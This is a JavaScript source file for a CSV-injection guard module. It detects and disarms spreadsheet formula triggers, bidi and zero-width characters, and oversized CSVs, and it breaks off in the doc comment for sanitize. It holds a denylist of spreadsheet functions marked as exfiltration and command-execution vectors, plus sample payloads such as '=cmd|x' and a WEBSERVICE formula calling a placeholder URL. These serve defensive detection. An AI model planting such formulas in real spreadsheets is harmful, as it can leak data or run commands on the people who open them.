// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * @module b.guardCsv
 * @nav    Guards
 * @title  Guard Csv
 *
 * @intro
 *   CSV content-safety guard — defends against the broader threat
 *   catalog operators face when emitting or accepting CSVs sourced from
 *   user input. `b.csv.parse` / `b.csv.stringify` handle RFC 4180
 *   shape; this module layers the security catalog on top.
 *
 *   CSV-injection / formula-trigger defense: spreadsheet evaluators
 *   (Excel / LibreOffice / Google Sheets) treat any cell beginning with
 *   `=`, `+`, `-`, `@`, TAB, CR, LF, or `|` as a formula — including
 *   exfiltration vectors like `=WEBSERVICE(...)`, `=HYPERLINK(...)`,
 *   `=IMPORTXML(...)`. Full-width variants (U+FF1D `＝`, U+FF0B `＋`,
 *   U+FF0D `－`, U+FF20 `＠`) are caught alongside the ASCII triggers
 *   per the OWASP locale catalog. Five mitigation modes apply:
 *   `prefix-tab` (OWASP-recommended, prepends TAB so the evaluator
 *   treats the cell as text), `prefix-quote` (legacy `'` prefix),
 *   `wrap-with-quotes-and-prefix` (email-attachment posture),
 *   `reject` (throw), `allowlist` (only documented safe functions
 *   like SUM / AVERAGE pass through unprefixed; anything the matcher
 *   cannot identify as an allowlisted call is prefixed).
 *
 *   The four prefixing modes force quoted output. OWASP places the
 *   prefix inside the quoted field, and a bare leading TAB is a
 *   delimiter under tab-separated import, so an unquoted prefix can
 *   put the trigger character back at the front of the cell.
 *
 *   Unicode bidi/zero-width strip: CVE-2021-42574 Trojan Source bidi
 *   overrides (U+202A-202E, U+2066-2069) are rejected or stripped
 *   per profile; zero-width characters (ZWSP / ZWNJ / ZWJ / WJ / SHY)
 *   and Unicode Tags block characters (U+E0000-E007F, the ASCII
 *   smuggling channel) always strip. Leading bidi/zero-width prefixes
 *   are stripped before the formula scan so a cell beginning with
 *   U+200B`=SUM(...)` cannot slip past the cell-start check.
 *
 *   CSV-bomb caps: per-cell (`maxCellBytes`, default 64 KiB), total
 *   (`maxTotalBytes`, default 1 GiB), row count (`maxRows`, default
 *   ~1 M), column count (`maxColumns`, default 1024), and a sanitize
 *   amplification ratio (`sanitizeAmplificationCap`, default 1.5x)
 *   that refuses pathological re-quote expansions.
 *
 *   Doubled-quote escape is delegated to `b.csv.stringify` — every
 *   cell value containing the delimiter, the quote char, CR, or LF
 *   is wrapped in quotes with embedded quotes doubled per RFC 4180.
 *
 *   Profiles: `strict` / `balanced` / `permissive` /
 *   `email-attachment`. Compliance postures: `hipaa` / `pci-dss` /
 *   `gdpr` / `soc2`. Operators select via `{ profile: "strict" }` or
 *   `{ compliancePosture: "hipaa" }`; postures overlay on top of the
 *   profile baseline.
 *
 *   Threat-detection regex literals are composed programmatically
 *   from numeric codepoint ranges so the source file stays pure
 *   ASCII — never embeds the attack characters themselves.
 *
 * @card
 *   CSV content-safety guard — defends against the broader threat catalog operators face when emitting or accepting CSVs sourced from user input.
 */

var codepointClass = require("./codepoint-class");
var csv = require("./csv");
var safeBuffer = require("./safe-buffer");
var C = require("./constants");
var lazyRequire = require("./lazy-require");
var numericBounds = require("./numeric-bounds");
var gateContract = require("./gate-contract");
var validateOpts = require("./validate-opts");
var { GuardCsvError } = require("./framework-error");

var observability = lazyRequire(function () { return require("./observability"); });
void observability;

var _err = GuardCsvError.factory;

var HOMOGLYPH_RANGES = [[0x0400, 0x04FF], [0x0370, 0x03FF], [0xFF21, 0xFF5A]];

var FORMULA_PREFIX_CPS = [0x3D, 0x2B, 0x2D, 0x40, 0x09, 0x0D, 0x0A, 0x7C,
                          0xFF1D, 0xFF0B, 0xFF0D, 0xFF20];

var DANGEROUS_FUNCTIONS = Object.freeze([
  "WEBSERVICE", "HYPERLINK", "IMAGE", "DDE", "RTD", "CALL",
  "IMPORTXML", "IMPORTRANGE", "IMPORTHTML", "IMPORTFEED", "IMPORTDATA",
  "GOOGLEFINANCE", "GOOGLETRANSLATE",
]);

var HEX_RADIX = 16;
var _fromCp    = codepointClass.fromCp;
function _stringFromCps(cps) {
  return cps.map(_fromCp).join("");
}

var BIDI_RANGES       = codepointClass.BIDI_RANGES;
var CTRL_RANGES       = codepointClass.CTRL_RANGES;
var ZERO_WIDTH_RANGES = codepointClass.ZERO_WIDTH_RANGES;
var TAG_RANGES        = codepointClass.TAG_RANGES;
var NULL_RANGES       = codepointClass.NULL_RANGES;
var BOM_CODE          = 0xFEFF;
var BOM_RANGES        = [BOM_CODE];


var CELL_DELIMITERS = [",", ";", "\t", "|"];

function _cellDelimiters(delimiter) {
  if (typeof delimiter !== "string" || delimiter.length === 0) return CELL_DELIMITERS;
  if (CELL_DELIMITERS.indexOf(delimiter) !== -1) return CELL_DELIMITERS;
  return CELL_DELIMITERS.concat([delimiter]);
}

var CR_CODE = 0x0D;
var LF_CODE = 0x0A;

function _isLineTerminator(ch) { return ch === "\r" || ch === "\n"; }

function _eachCellStart(text, quote, delims, visit) {
  if (visit(0)) return;
  var i = 0;
  while (i < text.length) {
    if (text.charAt(i) === quote) {
      i += 1;
      while (i < text.length) {
        if (text.charAt(i) !== quote) { i += 1; continue; }
        if (text.charAt(i + 1) === quote) { i += 2; continue; }
        i += 1;
        break;
      }
    }
    while (i < text.length &&
           delims.indexOf(text.charAt(i)) === -1 &&
           !_isLineTerminator(text.charAt(i))) {
      i += 1;
    }
    if (i >= text.length) return;
    if (_isLineTerminator(text.charAt(i))) {
      while (i < text.length && _isLineTerminator(text.charAt(i))) i += 1;
    } else {
      i += 1;
    }
    if (visit(i)) return;
  }
}

function _findFormulaCell(text, quote, delims, formulaPolicy) {
  if (typeof text !== "string") return null;
  var tabIsMitigation = formulaPolicy === "prefix-tab";
  var hit = null;
  _eachCellStart(text, quote, delims, function (at) {
    var quoted = text.charAt(at) === quote;
    var triggerAt = quoted ? at + 1 : at;
    var ch = text.charAt(triggerAt);
    if (ch === "") return false;
    if (FORMULA_PREFIXES.indexOf(ch) === -1) return false;
    if (!quoted && _isLineTerminator(ch)) return false;
    if (quoted && ch === "\t" && tabIsMitigation) return false;
    hit = { index: triggerAt, char: ch };
    return true;
  });
  return hit;
}

function _eachTriggeredWord(text, quote, delims, visit) {
  if (typeof text !== "string") return;
  _eachCellStart(text, quote, delims, function (start) {
    var at = text.charAt(start) === quote ? start + 1 : start;
    if (FORMULA_PREFIXES.indexOf(text.charAt(at)) === -1) return false;
    if (!_isNameStart(text.charAt(at + 1))) return false;
    var w = at + 1;
    while (w < text.length && _isWordChar(text.charAt(w))) w += 1;
    return visit(at, text.slice(at + 1, w));
  });
}

function _isNameStart(ch) {
  return (ch >= "A" && ch <= "Z") || (ch >= "a" && ch <= "z");
}

function _isWordChar(ch) {
  return _isNameStart(ch) || (ch >= "0" && ch <= "9") || ch === "_" || ch === ".";
}

function _leadingFunctionName(str) {
  if (typeof str !== "string" || str.length === 0) return null;
  if (FORMULA_PREFIXES.indexOf(str.charAt(0)) === -1) return null;
  if (!_isNameStart(str.charAt(1))) return null;
  var w = 1;
  while (w < str.length && _isWordChar(str.charAt(w))) w += 1;
  return str.slice(1, w);
}

var NULL_BYTE = codepointClass.NULL_BYTE;
var BOM_CHAR  = codepointClass.BOM_CHAR;

var FORMULA_PREFIXES = Object.freeze(_stringFromCps(FORMULA_PREFIX_CPS).split(""));

var DEFAULT_MAX_ROWS = 0x100000;

var PROFILES = Object.freeze({
  "strict": {
    formulaInjectionPolicy:   "prefix-tab",
    bidiCharPolicy:           "reject",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "reject",
    nullByteHandling:         "reject",
    trailingWhitespacePolicy: "trim",
    bomPrefix:                false,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
  "balanced": {
    formulaInjectionPolicy:   "prefix-tab",
    bidiCharPolicy:           "strip",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "preserve",
    bomPrefix:                false,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
  "permissive": {
    formulaInjectionPolicy:   "prefix-tab",
    bidiCharPolicy:           "audit",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "preserve",
    bomPrefix:                false,
    dialectPolicy:            "permissive",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "scientific",
    dateFormat:               "iso8601",
  },
  "email-attachment": {
    formulaInjectionPolicy:   "wrap-with-quotes-and-prefix",
    bidiCharPolicy:           "strip",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "trim",
    bomPrefix:                true,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
});

var DEFAULTS = gateContract.strictDefaults(PROFILES, {
  delimiter:                 ",",
  lineEnding:                "\r\n",
  encoding:                  "utf-8",
  locale:                    "C",
  formulasAllowlist:         Object.freeze(["SUM", "AVERAGE", "COUNT", "MIN", "MAX", "IF", "CONCATENATE"]),
  dangerousFunctions:        DANGEROUS_FUNCTIONS,
  maxRows:                   DEFAULT_MAX_ROWS,
  maxCellBytes:              C.BYTES.kib(64),
  maxTotalBytes:             C.BYTES.gib(1),
  maxColumns:                0x400,
  sanitizeAmplificationCap:  1.5,
  nullMarker:                "\\N",
  preserveLeadingZeros:      false,
  preserveBooleanStrings:    false,
  preserveDateStrings:       false,
  piiPolicy:                 "preserve",
  forensicSnippetBytes:      0,
  maxRuntimeMs:              C.TIME.seconds(30),
});

var COMPLIANCE_POSTURES = gateContract.compliancePostures(PROFILES, { base: 256, overlays: { hipaa: { piiPolicy: "redact" }, "pci-dss": { piiPolicy: "redact" }, gdpr: { piiPolicy: "redact" } } });

function _lineEndingCounts(text) {
  var counts = { crlf: 0, lf: 0, cr: 0 };
  for (var i = 0; i < text.length; i += 1) {
    var cc = text.charCodeAt(i);
    if (cc === CR_CODE) {
      if (text.charCodeAt(i + 1) === LF_CODE) { counts.crlf += 1; i += 1; }
      else counts.cr += 1;
    } else if (cc === LF_CODE) {
      counts.lf += 1;
    }
  }
  return counts;
}

function _firstLine(text) {
  for (var i = 0; i < text.length; i += 1) {
    var cc = text.charCodeAt(i);
    if (cc === CR_CODE || cc === LF_CODE) return text.slice(0, i);
  }
  return text;
}

var INVISIBLE_PREFIX_RANGES = [[0x200B, 0x200F], [0x202A, 0x202E],
                               [0x2066, 0x2069], 0xFEFF];

function _stripLeading(text, ranges) {
  var i = 0;
  while (i < text.length) {
    var cp = text.codePointAt(i);
    if (!codepointClass.inRanges(cp, ranges)) break;
    i += cp > 0xFFFF ? 2 : 1;
  }
  return i === 0 ? text : text.slice(i);
}

var _isAsciiLetter = codepointClass.isAsciiLetter;

function _startsWithAsciiLetter(text) {
  return text.length > 0 && _isAsciiLetter(text.charCodeAt(0));
}

function _hasAsciiLetter(text) {
  for (var i = 0; i < text.length; i++) {
    if (_isAsciiLetter(text.charCodeAt(i))) return true;
  }
  return false;
}

function _firstMatch(text, ranges) {
  if (typeof text !== "string") return null;
  var i = codepointClass.firstInRanges(text, ranges);
  if (i === -1) return null;
  var cp = text.codePointAt(i);
  return { index: i, char: String.fromCodePoint(cp), codePoint: cp };
}

function _detectIssues(text, opts) {
  var issues = [];
  if (typeof text !== "string") return issues;

  var bomIdx = text.indexOf(BOM_CHAR);
  if (bomIdx > 0 || (bomIdx === 0 && !opts.bomPrefix)) {
    issues.push({
      kind: "bom-mid-stream", severity: "high", ruleId: "csv.bom",
      location: bomIdx, snippet: "BOM at byte " + bomIdx,
    });
  }

  issues.push.apply(issues,
    codepointClass.detectCharThreats(text, _charPolicies(opts), "csv"));

  if (opts.homoglyphPolicy !== "allow" && _hasAsciiLetter(text)) {
    var homoMatch = _firstMatch(text, HOMOGLYPH_RANGES);
    if (homoMatch) {
      issues.push({
        kind: "homoglyph", severity: "warn", ruleId: "csv.homoglyph",
        location: homoMatch.index,
        snippet: "homoglyph U+" + homoMatch.codePoint.toString(HEX_RADIX) +
                 " mixed with ASCII at byte " + homoMatch.index,
      });
    }
  }


  if (opts.formulaInjectionPolicy !== "audit-only" && opts.formulaInjectionPolicy !== "allow") {
    var stripped = _stripLeading(text, INVISIBLE_PREFIX_RANGES);
    var formulaMatch = _findFormulaCell(stripped, opts.quote || "\"",
                                        _cellDelimiters(opts.delimiter),
                                        opts.formulaInjectionPolicy);
    if (formulaMatch) {
      issues.push({
        kind: "formula-prefix-cell", severity: "critical",
        ruleId: "csv.formula-injection",
        location: formulaMatch.index,
        snippet: "cell beginning with formula trigger " +
                 JSON.stringify(formulaMatch.char) +
                 " at byte " + formulaMatch.index +
                 (stripped.length !== text.length ? " (after stripping leading bidi/zero-width prefix)" : ""),
      });
    }
  }

  if (Array.isArray(opts.dangerousFunctions) && opts.dangerousFunctions.length > 0) {
    _eachTriggeredWord(text, opts.quote || "\"", _cellDelimiters(opts.delimiter),
                       function (at, name) {
      var fn = name.toUpperCase();
      if (opts.dangerousFunctions.indexOf(fn) !== -1) {
        issues.push({
          kind: "dangerous-function", severity: "critical",
          ruleId: "csv.dangerous-function",
          location: at,
          snippet: "spreadsheet function " + JSON.stringify(fn) +
                   " is on the dangerous-function denylist (exfiltration / RCE vector)",
        });
      }
      return false;
    });
  }

  if (opts.dialectPolicy === "strict") {
    var endings = _lineEndingCounts(text);
    var hasCrlf = endings.crlf > 0;
    var hasLfOnly = endings.lf > 0;
    var hasCrOnly = endings.cr > 0;
    if ((hasCrlf && hasLfOnly) || (hasCrlf && hasCrOnly) || (hasLfOnly && hasCrOnly)) {
      issues.push({
        kind: "dialect-mixed-line-endings", severity: "high",
        ruleId: "csv.dialect", snippet: "mixed line endings",
      });
    }
  }

  return issues;
}

function _charPolicies(opts) {
  return {
    bidiPolicy:      opts.bidiCharPolicy,
    controlPolicy:   opts.controlCharPolicy,
    nullBytePolicy:  opts.nullByteHandling,
    zeroWidthPolicy: opts.zeroWidthPolicy || "audit",
  };
}

function _stripIssues(text, opts) {
  if (typeof text !== "string") return text;
  codepointClass.assertNoCharThreats(text, _charPolicies(opts), _err, "csv");
  var out = text;
  var keepLeadingBom = opts.bomPrefix === true && out.charCodeAt(0) === BOM_CODE;
  out = codepointClass.stripRanges(out, BOM_RANGES);
  if (opts.bidiCharPolicy === "strip") out = codepointClass.stripRanges(out, BIDI_RANGES);
  if (opts.controlCharPolicy === "strip") out = codepointClass.stripRanges(out, CTRL_RANGES);
  if (opts.nullByteHandling === "strip") out = codepointClass.stripRanges(out, NULL_RANGES);
  if (opts.homoglyphPolicy === "strip") out = codepointClass.stripRanges(out, HOMOGLYPH_RANGES);
  out = codepointClass.stripRanges(out, ZERO_WIDTH_RANGES);
  out = codepointClass.stripRanges(out, TAG_RANGES);
  if (opts.trailingWhitespacePolicy === "trim") {
    out = out.split("\n").map(function (line) {
      return safeBuffer.stripTrailingHspace(line);
    }).join("\n");
  }
  return keepLeadingBom ? BOM_CHAR + out : out;
}

/**
 * @primitive  b.guardCsv.escapeCell
 * @signature  b.guardCsv.escapeCell(value, opts?)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.serialize, b.guardCsv.gate, b.csv.stringify
 *
 * Apply the full guard-csv threat catalog to a single cell value:
 * formula-prefix mitigation, null-byte / C0-control / bidi handling,
 * trailing-whitespace policy, numeric-precision policy, and BigInt
 * disposition. Returns the safe string form. Throws `GuardCsvError`
 * when a `reject` policy fires (formula-trigger under
 * `formulaInjectionPolicy: "reject"`, control char under
 * `controlCharPolicy: "reject"`, etc.) or when the cell exceeds
 * `maxCellBytes`.
 *
 * Used internally by `b.guardCsv.serialize` per cell; exposed
 * directly for operators that emit CSV through their own writer
 * (streaming exports, third-party libraries) and only need the
 * per-cell defense.
 *
 * A writer of your own must emit the returned value as a QUOTED field
 * under any of the prefixing policies. OWASP places the prefix inside
 * the quoted field: emitted bare, a leading TAB is a delimiter under
 * tab-separated import and is dropped by consumers that trim leading
 * whitespace from unquoted fields, either of which puts the trigger
 * character back at the front of the cell. `b.guardCsv.serialize`
 * quotes for you; a writer you supply does not.
 *
 * Escaping is a fixed point — passing a value that escapeCell already
 * returned gives that value back unchanged, so a pipeline that escapes
 * twice does not stack prefixes.
 *
 * @opts
 *   formulaInjectionPolicy: "prefix-tab"|"prefix-quote"|"wrap-with-quotes-and-prefix"|"reject"|"allowlist"|"audit-only"|"allow",
 *   formulasAllowlist:      string[],   // when policy === "allowlist"
 *   bidiCharPolicy:         "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy:      "reject"|"strip"|"allow",
 *   nullByteHandling:       "reject"|"strip"|"allow",
 *   trailingWhitespacePolicy: "trim"|"preserve"|"reject",
 *   numericPrecisionPolicy: "decimal-string-above-safe-int"|"scientific"|"reject-bigint",
 *   maxCellBytes:           number,     // default 65536 (64 KiB)
 *
 * @example
 *   var safe = b.guardCsv.escapeCell("=cmd|x", { formulaInjectionPolicy: "prefix-tab" });
 *   safe;                                              // → "\t=cmd|x"
 *
 *   // Reject mode throws GuardCsvError instead of disarming.
 *   try {
 *     b.guardCsv.escapeCell("+1234567", { formulaInjectionPolicy: "reject" });
 *   } catch (e) {
 *     e.code;                                          // → "csv.formula-injection"
 *   }
 *
 *   // Numeric precision: above MAX_SAFE_INTEGER, write as decimal string.
 *   var huge = b.guardCsv.escapeCell(9007199254740993, {
 *     numericPrecisionPolicy: "decimal-string-above-safe-int",
 *   });
 *   huge;                                              // → "9007199254740993"
 */
function escapeCell(value, opts) {
  return _escapeCell(value, opts).value;
}

function _escapeCell(value, opts) {
  opts = Object.assign({}, DEFAULTS, opts || {});
  var str = value == null ? "" : String(value);
  var mitigated = false;

  var cellBytes = Buffer.byteLength(str, "utf8");
  if (cellBytes > opts.maxCellBytes) {
    throw _err("csv.cell-too-large",
      "cell is " + cellBytes + " bytes, exceeds maxCellBytes " + opts.maxCellBytes);
  }

  if (opts.nullByteHandling === "reject" && str.indexOf(NULL_BYTE) !== -1) {
    throw _err("csv.null-byte", "cell contains null byte");
  }
  if (opts.controlCharPolicy === "reject" &&
      codepointClass.firstInRanges(str, CTRL_RANGES) !== -1) {
    throw _err("csv.control", "cell contains C0 control character");
  }
  if (opts.bidiCharPolicy === "reject" &&
      codepointClass.firstInRanges(str, BIDI_RANGES) !== -1) {
    throw _err("csv.bidi", "cell contains Unicode bidi override (CVE-2021-42574)");
  }

  if (opts.nullByteHandling === "strip") str = codepointClass.stripRanges(str, NULL_RANGES);
  if (opts.controlCharPolicy === "strip") str = codepointClass.stripRanges(str, CTRL_RANGES);
  if (opts.bidiCharPolicy === "strip") str = codepointClass.stripRanges(str, BIDI_RANGES);

  if (opts.trailingWhitespacePolicy === "trim") {
    str = safeBuffer.stripTrailingHspace(str);
  } else if (opts.trailingWhitespacePolicy === "reject") {
    var lastCode = str.length > 0 ? str.charCodeAt(str.length - 1) : 0;
    if (lastCode === 0x20 || lastCode === 0x09) {
      throw _err("csv.trailing-whitespace", "cell has trailing whitespace");
    }
  }

  if (typeof value === "number" &&
      opts.numericPrecisionPolicy === "decimal-string-above-safe-int") {
    if (Math.abs(value) > Number.MAX_SAFE_INTEGER) {
      str = value.toLocaleString("en-US", {
        useGrouping: false, maximumFractionDigits: 0,
      });
    }
  }
  if (typeof value === "bigint") {
    if (opts.numericPrecisionPolicy === "reject-bigint") {
      throw _err("csv.bigint", "BigInt values rejected per numericPrecisionPolicy");
    }
    str = value.toString();
  }

  if (str.length > 0 && FORMULA_PREFIXES.indexOf(str.charAt(0)) !== -1) {
    var policy = opts.formulaInjectionPolicy;
    if (policy === "reject") {
      throw _err("csv.formula-injection",
        "cell starts with formula prefix " + JSON.stringify(str.charAt(0)));
    } else if (policy === "prefix-tab") {
      if (str.charAt(0) !== "\t") str = "\t" + str;
      mitigated = true;
    } else if (policy === "prefix-quote") {
      str = "'" + str; mitigated = true;
    } else if (policy === "wrap-with-quotes-and-prefix") {
      str = "'" + str; mitigated = true;
    } else if (policy === "allowlist") {
      var firstWord = _leadingFunctionName(str);
      var allowed = firstWord !== null && opts.formulasAllowlist.some(function (fn) {
        return String(fn).toUpperCase() === firstWord.toUpperCase();
      });
      if (!allowed) { str = "'" + str; mitigated = true; }
    }
  }

  return { value: str, mitigated: mitigated };
}

/**
 * @primitive  b.guardCsv.schema
 * @signature  b.guardCsv.schema(spec)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.serialize, b.guardCsv.validate
 *
 * Build a schema-bound serializer/validator pair. Each row's column
 * values are checked against the column's `type` (`"string"` /
 * `"number"` / `"boolean"`), optional `regex`, optional `min` / `max`
 * (for numbers), and `nullable` flag before the row reaches
 * `serialize`. Type / range / regex / null violations throw
 * `GuardCsvError` with codes `csv.schema-type` / `csv.schema-range`
 * / `csv.schema-regex` / `csv.schema-null` and the offending row
 * index — operators get the failing-row coordinates without parsing
 * the error string.
 *
 * Returns `{ serialize, validate, columns }`. The returned
 * `serialize` accepts the same opts as `b.guardCsv.serialize` and
 * applies the column ordering automatically.
 *
 * @example
 *   var bound = b.guardCsv.schema({
 *     columns: [
 *       { name: "email", type: "string", regex: /^[^@]+@[^@]+$/ },
 *       { name: "age",   type: "number", min: 0, max: 150, nullable: true },
 *     ],
 *   });
 *
 *   var out = bound.serialize([
 *     { email: "alice@example.com", age: 30 },
 *     { email: "bob@example.com",   age: null },
 *   ], { profile: "strict" });
 *   out.indexOf("alice@example.com") !== -1;           // → true
 */
function schema(spec) {
  validateOpts.requireObject(spec, "guardCsv.schema", GuardCsvError);
  if (!Array.isArray(spec.columns)) {
    throw _err("csv.bad-schema", "schema.columns must be an array");
  }
  var cols = spec.columns.slice();

  return {
    serialize: function (rows, opts) {
      opts = opts || {};
      var validated = [];
      for (var ri = 0; ri < rows.length; ri += 1) {
        var row = rows[ri];
        var validatedRow = {};
        for (var ci = 0; ci < cols.length; ci += 1) {
          var col = cols[ci];
          var v = row[col.name];
          if (v == null) {
            if (col.nullable === false) {
              throw _err("csv.schema-null",
                "column " + JSON.stringify(col.name) +
                " is non-nullable; row " + ri + " has null");
            }
            validatedRow[col.name] = v;
            continue;
          }
          if (col.type === "string" && typeof v !== "string") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects string at row " + ri);
          }
          if (col.type === "number" && typeof v !== "number") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects number at row " + ri);
          }
          if (col.type === "boolean" && typeof v !== "boolean") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects boolean at row " + ri);
          }
          if (col.regex && !col.regex.test(String(v))) {
            throw _err("csv.schema-regex",
              "column " + JSON.stringify(col.name) +
              " value " + JSON.stringify(v) +
              " at row " + ri + " does not match regex " + col.regex);
          }
          if (col.type === "number" && typeof col.min === "number" && v < col.min) {
            throw _err("csv.schema-range",
              "column " + JSON.stringify(col.name) + " < min at row " + ri);
          }
          if (col.type === "number" && typeof col.max === "number" && v > col.max) {
            throw _err("csv.schema-range",
              "column " + JSON.stringify(col.name) + " > max at row " + ri);
          }
          validatedRow[col.name] = v;
        }
        validated.push(validatedRow);
      }
      return serialize(validated, Object.assign({
        headers: cols.map(function (c) { return c.name; }),
      }, opts));
    },
    validate: function (input, opts) {
      return module.exports.validate(input, Object.assign({ schema: spec }, opts || {}));
    },
    columns: cols,
  };
}

/**
 * @primitive  b.guardCsv.serialize
 * @signature  b.guardCsv.serialize(rows, opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.escapeCell, b.guardCsv.gate, b.csv.stringify
 *
 * Emit RFC 4180 CSV from `rows` (array of objects or array of
 * arrays) with the full guard-csv threat catalog applied per cell
 * — formula-prefix mitigation, bidi/null/control handling,
 * trailing-whitespace policy, numeric-precision policy. Doubled-
 * quote escape is delegated to `b.csv.stringify`. Caps enforced:
 * `maxRows`, `maxCellBytes`, `maxColumns`, `maxTotalBytes` (each
 * a positive finite integer; passing `Infinity` throws).
 *
 * When `piiPolicy: "redact"` is set and an `opts.redact` instance
 * is passed (typically `b.redact.create(...)`), every emitted
 * string cell is run through `redact.string(...)` before
 * stringification. The HIPAA / PCI-DSS / GDPR postures default
 * `piiPolicy` to `"redact"`.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   headers:    string[]|false,    // explicit column order; false suppresses header row
 *   delimiter:  string,            // default ","
 *   lineEnding: string,            // default "\r\n"
 *   bomPrefix:  boolean,           // prepend U+FEFF (Excel-friendly)
 *   maxRows:    number,            // default 1048576
 *   maxCellBytes:  number,         // default 65536
 *   maxColumns: number,            // default 1024
 *   maxTotalBytes: number,         // default 1073741824 (1 GiB)
 *   piiPolicy:  "preserve"|"redact",
 *   redact:     b.redact instance, // required when piiPolicy === "redact"
 *
 * @example
 *   var out = b.guardCsv.serialize([
 *     { name: "alice", note: "=WEBSERVICE(\"http://x\")" },
 *     { name: "bob",   note: "ok" },
 *   ], { profile: "strict" });
 *
 *   // Formula trigger disarmed with a leading TAB inside the quoted
 *   // field, which is the form OWASP specifies:
 *   out.indexOf("\"\t=WEBSERVICE") !== -1;             // → true
 *   out.indexOf("\r\n") !== -1;                        // → true
 */
function serialize(rows, opts) {
  opts = module.exports.resolveOpts(opts);
  numericBounds.requireAllPositiveFiniteIntIfPresent(opts,
    ["maxRows", "maxCellBytes", "maxTotalBytes"],
    "guardCsv.serialize", GuardCsvError, "csv/bad-opt");

  if (!Array.isArray(rows)) {
    throw _err("csv/bad-input",
      "serialize: rows must be an array, got " + typeof rows);
  }
  if (rows.length > opts.maxRows) {
    throw _err("csv.too-many-rows",
      "row count " + rows.length + " exceeds maxRows " + opts.maxRows);
  }

  var redactor = (opts.piiPolicy === "redact" && opts.redact) ? opts.redact : null;

  var mitigationApplied = false;
  function _escaped(value) {
    var r = _escapeCell(value, opts);
    if (r.mitigated) mitigationApplied = true;
    return r.value;
  }

  var escapedRows = [];
  for (var ri = 0; ri < rows.length; ri += 1) {
    var row = rows[ri];
    var escapedRow;
    if (Array.isArray(row)) {
      escapedRow = row.map(function (v) {
        var ev = _escaped(v);
        if (Buffer.byteLength(ev, "utf8") > opts.maxCellBytes) {
          throw _err("csv.cell-too-large",
            "cell at row " + ri + " exceeds maxCellBytes " + opts.maxCellBytes);
        }
        if (redactor && typeof ev === "string") ev = redactor.string(ev);
        return ev;
      });
    } else if (row !== null && typeof row === "object") {
      escapedRow = {};
      var keys = Object.keys(row);
      if (keys.length > opts.maxColumns) {
        throw _err("csv.too-many-columns",
          "row " + ri + " has " + keys.length + " columns; max " + opts.maxColumns);
      }
      for (var ki = 0; ki < keys.length; ki += 1) {
        var ev2 = _escaped(row[keys[ki]]);
        if (Buffer.byteLength(ev2, "utf8") > opts.maxCellBytes) {
          throw _err("csv.cell-too-large",
            "cell at row " + ri + " column " + JSON.stringify(keys[ki]) +
            " exceeds maxCellBytes");
        }
        if (redactor && typeof ev2 === "string") ev2 = redactor.string(ev2);
        escapedRow[keys[ki]] = ev2;
      }
    } else {
      throw _err("csv/bad-input", "rows must be arrays or plain objects");
    }
    escapedRows.push(escapedRow);
  }

  var out = csv.stringify(escapedRows, {
    delimiter:    opts.delimiter,
    quote:        opts.quote || "\"",
    eol:          opts.lineEnding,
    alwaysQuote:  mitigationApplied || opts.alwaysQuote || false,
    columns:      opts.headers || null,
    header:       opts.headers !== false,
  });

  var totalBytes = Buffer.byteLength(out, "utf8");
  if (opts.bomPrefix) {
    out = BOM_CHAR + out;
    totalBytes += 3;
  }
  if (totalBytes > opts.maxTotalBytes) {
    throw _err("csv.total-too-large",
      "output size " + totalBytes + " bytes exceeds maxTotalBytes " + opts.maxTotalBytes);
  }
  return out;
}

/**
 * @primitive  b.guardCsv.validate
 * @signature  b.guardCsv.validate(input, opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.sanitize, b.guardCsv.gate
 *
 * Inspect `input` (string or Buffer of CSV text) and return
 * `{ ok, issues }`. Each issue carries `{ kind, severity,
 * ruleId, location, snippet }` with severity in
 * `"warn"|"high"|"critical"`. Detected: BOM mid-stream, Unicode
 * bidi override (CVE-2021-42574), C0 control char, null byte,
 * homoglyph, zero-width char, formula-prefix cell (bidi/zero-width
 * leading prefix is stripped before the scan), dangerous-function
 * denylist hit, mixed line endings (when `dialectPolicy: "strict"`).
 * Pure inspection — never mutates input or throws.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   bidiCharPolicy:        "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy:     "reject"|"strip"|"allow",
 *   nullByteHandling:      "reject"|"strip"|"allow",
 *   homoglyphPolicy:       "audit"|"strip"|"allow",
 *   formulaInjectionPolicy: "prefix-tab"|"prefix-quote"|"wrap-with-quotes-and-prefix"|"reject"|"allowlist"|"audit-only"|"allow",
 *   dangerousFunctions:    string[],
 *   dialectPolicy:         "strict"|"permissive",
 *
 * @example
 *   var rv = b.guardCsv.validate("name,formula\r\nalice,=WEBSERVICE(\"x\")\r\n", {
 *     profile: "strict",
 *   });
 *   rv.ok;                                             // → false
 *   rv.issues.some(function (i) { return i.kind === "dangerous-function"; });  // → true
 */

/**
 * @primitive  b.guardCsv.sanitize
